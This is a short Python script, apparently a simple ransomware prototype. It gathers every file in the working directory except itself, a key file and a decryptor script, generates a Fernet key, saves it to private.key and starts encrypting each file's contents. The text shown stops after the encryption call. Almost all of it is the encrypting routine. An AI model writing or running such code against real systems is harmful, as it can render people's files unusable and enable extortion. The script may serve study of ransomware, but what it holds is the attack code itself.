import os
from cryptography.fernet import Fernet


files = []

for file in os.listdir():
    if file == "m1d.py" or file == "private.key" or file == "m1dec.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)


key = Fernet.generate_key()


with open("private.key", "wb") as private:
    private.write(key)

for file in files:
        with open(file, "rb") as locked:
                contents = locked.read()
        contents_encrypted = Fernet(key).encrypt(contents)